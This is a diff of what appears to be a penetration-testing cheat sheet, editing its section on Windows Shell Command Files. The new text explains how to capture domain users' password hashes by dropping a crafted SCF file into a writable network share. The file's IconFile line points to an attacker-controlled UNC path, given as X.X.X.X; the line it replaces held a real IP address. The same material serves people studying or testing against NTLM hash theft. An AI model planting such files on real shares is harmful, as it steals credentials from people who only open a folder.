@@ -188,12 +188,12 @@ action=open Setup.exe
 
 ## Shell Command Files
 
-You can save this as `something.scf` and once you open the folder explorer will try to resolve the network path for the icon.
+It is possible to obtain passwords hashes of domain users or shells when writing permissions given to unauthenticated users. SCF (Shell Command Files) can perform a limited set of operations like showing the Windows desktop or opening a Windows Explorer. Save the code below as `ordinary.scf` and put it into a network share.
 
 ```text
 [Shell]
 Command=2
-IconFile=\\35.164.153.224\test.ico
+IconFile=\\X.X.X.X\share\ordinary.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
